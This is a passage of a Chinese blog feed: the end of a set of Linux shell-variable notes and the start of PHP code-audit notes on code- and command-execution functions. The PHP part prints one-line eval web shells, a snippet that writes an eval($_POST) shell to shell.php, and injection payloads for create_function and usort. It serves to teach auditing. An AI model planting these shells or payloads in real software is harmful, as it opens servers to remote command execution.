64</span><br><span class="line">drwxr-xr-x.  2 root root 4096 Oct 15  2017 .</span><br><span class="line">drwxr-xr-x. 82 root root 4096 Sep 24 23:07 ..</span><br><span class="line">-rw-r--r--.  1 root root  123 Jul 31  2015 less.csh</span><br><span class="line">-rw-r--r--.  1 root root  121 Jul 31  2015 less.sh</span><br><span class="line">-rw-r--r--   1 root root  105 Aug  2  2017 vim.csh</span><br><span class="line">-rw-r--r--   1 root root  269 Aug  2  2017 vim.sh</span><br><span class="line">-rw-r--r--.  1 root root  164 Jan 28  2014 which2.csh</span><br><span class="line">-rw-r--r--.  1 root root  169 Jan 28  2014 which2.sh</span><br><span class="line">-rw-r--r--. 1 root root 1741 Feb 20 05:44 lang.csh </span><br><span class="line">-rw-r--r--. 1 root root 2706 Feb 20 05:44 lang.sh</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><blockquote><p>不难发现，有些文件与系统中的特定应用有关。</p><p>大部分应用都会创建两个启动文件：一个供bash shell使用（使用.sh扩展名），一个供c shell使用（使用.csh扩展名）。</p><p>其中lang.csh和lang.sh文件是用来设置字符集的。</p></blockquote></li><li><p>$HOME目录下的启动文件</p><blockquote><p>这些启动文件都起着同一个作用：提供一个用户专属的启动文件来定义该用户所用到的环</p><p>境变量。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls -a $HOME</span><br><span class="line">.  ..  .bash_history  .bash_logout  .bash_profile  .bashrc  .cache  cqhttp  .cshrc  H1ve  my_cmd  .pip  .pki  .pydistutils.cfg  .ssh  .tcshrc  .viminfo  .viminfo.tmp  web</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat $HOME/.bash_profile</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.bash_profile</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Get the aliases and <span class="built_in">functions</span></span></span><br><span class="line">if [ -f ~/.bashrc ]; then</span><br><span class="line">. ~/.bashrc</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User specific environment and startup programs</span></span><br><span class="line"></span><br><span class="line">PATH=$PATH:$HOME/bin</span><br><span class="line"></span><br><span class="line">export PATH</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>这里先会判断.bashrc文件是否存在，若存在先执行这个文件。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat .bashrc </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.bashrc</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User specific aliases and <span class="built_in">functions</span></span></span><br><span class="line"></span><br><span class="line">alias rm=&#x27;rm -i&#x27;</span><br><span class="line">alias cp=&#x27;cp -i&#x27;</span><br><span class="line">alias mv=&#x27;mv -i&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Source global definitions</span></span><br><span class="line">if [ -f /etc/bashrc ]; then</span><br><span class="line">. /etc/bashrc</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里可以设置别名，比如我添加<code>alias la=&#39;ls -a&#39;</code>,重启shell后</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat ~/.bashrc </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">.bashrc</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">User specific aliases and <span class="built_in">functions</span></span></span><br><span class="line"></span><br><span class="line">alias rm=&#x27;rm -i&#x27;</span><br><span class="line">alias cp=&#x27;cp -i&#x27;</span><br><span class="line">alias mv=&#x27;mv -i&#x27;</span><br><span class="line">alias la=&#x27;ls -a&#x27;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Source global definitions</span></span><br><span class="line">if [ -f /etc/bashrc ]; then</span><br><span class="line">. /etc/bashrc</span><br><span class="line">fi</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# la</span><br><span class="line">.  ..  .bash_history  .bash_logout  .bash_profile  .bashrc  .cache  cqhttp  .cshrc  H1ve  my_cmd  .pip  .pki  .pydistutils.cfg  .ssh  .tcshrc  .viminfo  .viminfo.tmp  web</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><code>PATH=$PATH:$HOME/bin</code>则应该是登录shell后自动添加路径到PATH中</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">编辑为PATH=$PATH:$HOME/bin:$HOME/my_cmd</span><br><span class="line">重启shell后/source立即生效后</span><br><span class="line"></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin:/root/my_cmd</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# hello</span><br><span class="line">hello khaz</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="环境变量立即生效"><a href="#环境变量立即生效" class="headerlink" title="环境变量立即生效"></a>环境变量立即生效</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source xxx</span><br></pre></td></tr></table></figure><h3 id="环境变量特性"><a href="#环境变量特性" class="headerlink" title="环境变量特性"></a>环境变量特性</h3><blockquote><p>环境变量有一个很酷的特性就是，它们可作为数组使用。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# arrary=(1 2 3)</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $arrary</span><br><span class="line">1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $arrary[1]</span><br><span class="line">1[1]</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $&#123;arrary[1]&#125;</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>在使用变量时最好将变量名用{}括起来，否则可能会解析错误。</p><h1 id="shell脚本编写"><a href="#shell脚本编写" class="headerlink" title="shell脚本编写"></a>shell脚本编写</h1><ol><li><p>创建shell脚本</p><blockquote><p>在创建shell脚本文件时，必须在文件的第一行指定要使用的shell。其格式为：<code>#!/bin/bash </code></p><p>在通常的shell脚本中，井号（#）用作注释行。shell并不会处理shell脚本中的注释行。然而，</p><p>shell脚本文件的第一行是个例外，#后面的惊叹号会告诉shell用哪个shell来运行脚本。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">echo hello world</span><br></pre></td></tr></table></figure></li><li><p>设置权限</p><p><code>sudo chmod +x file_name </code></p></li><li><p>运行脚本</p><ul><li>shell 脚本文件名</li><li>chmod +x 脚本文件名; 脚本文件名</li><li>. 脚本文件名</li><li>source 脚本文件名</li></ul></li></ol><p>脚本文件名如<code>./name.sh</code></p><img src="E:\typora img\20210321121053755.png" alt="在这里插入图片描述" style="zoom: 80%;" /><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><h4 id="定义与使用"><a href="#定义与使用" class="headerlink" title="定义与使用"></a>定义与使用</h4><blockquote><p>如果要用到变量，使用$；</p><p>如果要操作变量，不使用$。</p><p>这条规则的一个例外就是使用printenv显示某个变量的值。</p></blockquote><p>用到变量 → 用到变量的值</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo $a  #输出变量的值</span><br><span class="line">printenv PATH #用到变量的值，但不需要加$</span><br></pre></td></tr></table></figure><p>操作变量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a=1 #定义变量</span><br><span class="line">export a #导出变量</span><br><span class="line">unset a #删除变量</span><br></pre></td></tr></table></figure><h4 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h4><p>能够让变量作为命令行参数</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME</span><br><span class="line">/root</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls $HOME</span><br><span class="line">H1ve  web</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ls /root</span><br><span class="line">H1ve  web</span><br></pre></td></tr></table></figure><p>内敛执行</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat `ls`</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat $(ls)</span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;读取当前目录的所有文件</span></span><br><span class="line">将ls的输出作为cat的输入进行执行。</span><br></pre></td></tr></table></figure><blockquote><p>先执行的命令是由当前shell创建的子shell执行的。</p></blockquote><p>加上{}用于区分变量</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# a=b</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $ab</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">因为找不到变量ab，所以输出为空</span></span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $&#123;a&#125;b</span><br><span class="line">bb</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>当变量值含有空格时，就要加上引号。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# b= world</span><br><span class="line">-bash: world: command not found</span><br></pre></td></tr></table></figure><p>单引号：不能解析变量，只会原样输出</p><p>双引号：能够解析变量</p><ul><li>获取字符串长度   &#96;$</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计基础</title>
      <link href="/2023/05/31/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/05/31/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><p><code>&lt;?php eval(&quot;$_POST[1]&quot;)?&gt;</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;payload&#x27;</span>);</span><br></pre></td></tr></table></figure><p>需要在语句末加上；</p><h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h2><p><code>&lt;?php assert(&quot;$_POST[1]&quot;)?&gt;</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;payload&#x27;</span>)</span><br></pre></td></tr></table></figure><p>不需要在语句末加上；</p><h2 id="eval和assert二者区别–注意"><a href="#eval和assert二者区别–注意" class="headerlink" title="eval和assert二者区别–注意"></a>eval和assert二者区别–注意</h2><p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p><p>但php7中，<code>assert</code>不再是函数，变成了一个语言结构（类似<code>eval</code>），不能再作为函数名动态执行代码</p><h2 id="preg-replace的-x2F-e模式"><a href="#preg-replace的-x2F-e模式" class="headerlink" title="preg_replace的&#x2F;e模式"></a>preg_replace的&#x2F;e模式</h2><p>php版本&lt;5.5</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/pattern/e&#x27;</span>,<span class="variable">$command</span>,<span class="variable">$value</span> );</span><br></pre></td></tr></table></figure><p>在&#x2F;e模式下，如果正则匹配成功，就会命令执行preg_replace()的第二个参数</p><h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h2><p><strong>PHP 7.2.0 起被<em>废弃</em>，并自 PHP 8.0.0 起被<em>移除</em></strong></p><blockquote><p>此函数在内部执行 <a href="https://www.php.net/manual/zh/function.eval.php">eval()</a>，因此具有跟 <a href="https://www.php.net/manual/zh/function.eval.php">eval()</a> 相同的安全问题。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line">等价于</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">       <span class="variable">$b</span>;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>当<code>$b=1;&#125;phpinfo();/*</code>时</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">       <span class="number">1</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*</span></span><br><span class="line"><span class="comment">&#125;  </span></span><br></pre></td></tr></table></figure><p>整理一下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"> <span class="comment">/*&#125;  </span></span><br></pre></td></tr></table></figure><p>执行了phpinfo()</p><h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cmd</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;cmd&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="comment"># 第一个参数为回调函数,其余参数是回调函数的参数</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>call_user_func_array()，第二个参数要为数组</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cmd</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;cmd&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = [<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="comment"># 第一个参数为回调函数,其余参数是回调函数的参数</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$func</span>, <span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><h2 id="变量函数"><a href="#变量函数" class="headerlink" title="变量函数"></a>变量函数</h2><p><strong>PHP&lt;7</strong></p><p>如果在一个变量后面加上一对括号，那么解释器会试图寻找名字和这个变量的值一样的一个函数，如果找到了就执行它。</p><p>所以php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;system(&#x27;whoami&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="数组函数"><a href="#数组函数" class="headerlink" title="数组函数"></a>数组函数</h2><h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cmd</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;cmd&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = [<span class="string">&#x27;whoami&#x27;</span>,<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="comment"># 第一个参数为回调函数，第二个为传入的参数数组</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>, <span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure><p>相当于执行了两次whoami命令</p><h3 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter"></a>array_filter</h3><p>参数位置换了一下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cmd</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;cmd&#x27;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = [<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="comment"># 第一个参数为传入的参数数组,第二个参数为回调函数</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">array_filter</span>(<span class="variable">$cmd</span>, <span class="variable">$func</span>);</span><br></pre></td></tr></table></figure><h3 id="usort、uasort"><a href="#usort、uasort" class="headerlink" title="usort、uasort"></a>usort、uasort</h3><p>PHP&lt;7</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">usort</span>(<span class="variable">$_GET</span>,<span class="string">&#x27;system&#x27;</span>);    <span class="comment">//xxx.php?1=1&amp;2=whoami</span></span><br><span class="line"><span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);  <span class="comment">//xxx.php?1[]=test&amp;1[]=phpinfo();&amp;2=assert</span></span><br></pre></td></tr></table></figure><h1 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h1><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认无回显</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()和反引号</span><br><span class="line"><span class="title function_ invoke__">popen</span>()，<span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认有回显</span></span><br><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br></pre></td></tr></table></figure><h2 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">exec</span> ( 命令，结果数组 ，状态码 )</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;whoami&quot;</span>,<span class="variable">$output</span>,<span class="variable">$return_var</span>);</span><br><span class="line"><span class="comment"># 默认无回显，要想获得结果，就要输出第二个参数</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment"># 命令执行成功的状态码为0</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$return_var</span>);</span><br></pre></td></tr></table></figure><h2 id="system"><a href="#system" class="headerlink" title="system()"></a><strong>system()</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">system</span> ( 命令, 状态码 )</span><br></pre></td></tr></table></figure><p>实际上是执行了<code>sh -c &quot;command&quot;</code>命令</p><p><strong>system()函数</strong>执行有回显，将执行结果输出到页面上</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a><strong>passthru()</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void passthru ( 命令, 状态码  )</span><br></pre></td></tr></table></figure><p>和<strong>system函数</strong>类似，执行有回显，将执行结果输出到页面上</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="shell-exec-和-反引号"><a href="#shell-exec-和-反引号" class="headerlink" title="shell_exec()和 反引号"></a><strong>shell_exec()和 反引号</strong></h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">shell_exec</span>( 命令 )</span><br></pre></td></tr></table></figure><p><strong>shell_exec()函数</strong>默认无回显，通过 <strong>echo</strong> 可将执行结果输出到页面</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>shell_exec() 函数实际上仅是反撇号 () 操作符的变体，当禁用shell_exec时，&#96; 也不可执行</strong></p><p>反引号在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    `whoami`;</span><br><span class="line">    <span class="keyword">echo</span> `whoami`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="popen"><a href="#popen" class="headerlink" title="popen()"></a><strong>popen()</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">resource popen ( string $command , string $mode )</span><br></pre></td></tr></table></figure><p>函数需要两个参数，一个是执行的命令**<code>command</code><strong>，另外一个是指针文件的连接模式</strong><code>mode</code>**，有<code>r</code>和<code>w</code>代表读和写。</p><p>函数不会直接返回执行结果，而是返回一个文件指针，但是命令已经执行。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">popen</span>(<span class="string">&#x27;ls -l&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;popen() failed\n&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((<span class="variable">$line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$line</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="proc-open-函数"><a href="#proc-open-函数" class="headerlink" title="proc_open()函数"></a>proc_open()函数</h2><p>与<code>popen()</code>类似，只是可以开两个管道。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">resource <span class="title function_ invoke__">proc_open</span> ( </span><br><span class="line"><span class="keyword">string</span> <span class="variable">$cmd</span> , </span><br><span class="line"><span class="keyword">array</span> <span class="variable">$descriptorspec</span> , </span><br><span class="line"><span class="keyword">array</span> &amp;<span class="variable">$pipes</span> [, <span class="keyword">string</span> <span class="variable">$cwd</span> [, <span class="keyword">array</span> <span class="variable">$env</span> [, <span class="keyword">array</span> <span class="variable">$other_options</span> ]]] </span><br><span class="line">)</span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$test</span> = <span class="string">&quot;ipconfig&quot;</span>;  </span><br><span class="line"><span class="variable">$array</span> =   <span class="keyword">array</span>(  </span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;r&quot;</span>),   <span class="comment">//标准输入 </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>),   <span class="comment">//标准输出内容 </span></span><br><span class="line"> <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>,<span class="string">&quot;w&quot;</span>)    <span class="comment">//标准输出错误 </span></span><br><span class="line"> );  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$test</span>,<span class="variable">$array</span>,<span class="variable">$pipes</span>);   <span class="comment">//打开一个进程通道 </span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);    <span class="comment">//为什么是$pipes[1]，因为1是输出内容 stream_get_contents — 读取资源流到一个字符串</span></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$fp</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h1><p><a href="https://www.php.net/manual/zh/ref.filesystem.php">https://www.php.net/manual/zh/ref.filesystem.php</a></p><h2 id="fopen-模式"><a href="#fopen-模式" class="headerlink" title="fopen() 模式"></a>fopen() 模式</h2><table><thead><tr><th align="left">:-</th><th>-</th></tr></thead><tbody><tr><td align="left"><code>r</code></td><td>读</td></tr><tr><td align="left"><code>r+</code></td><td>读写，前置</td></tr><tr><td align="left"><code>w</code></td><td>写入，截断</td></tr><tr><td align="left"><code>w+</code></td><td>读写，截断</td></tr><tr><td align="left"><code>a</code></td><td>写，追加</td></tr><tr><td align="left"><code>a+</code></td><td>读写，追加</td></tr></tbody></table><h2 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>,<span class="string">&quot;a&quot;</span>),<span class="string">&quot;&lt;?php eval(<span class="subst">$_POST</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="string">&quot;Hello, world!&quot;</span>;</span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;example.txt&quot;</span>;</span><br><span class="line"><span class="comment"># FILE_APPEND:数据追加，而不是覆盖</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>, FILE_APPEND);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;example.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><figure class="highlight php"><table><tr><td 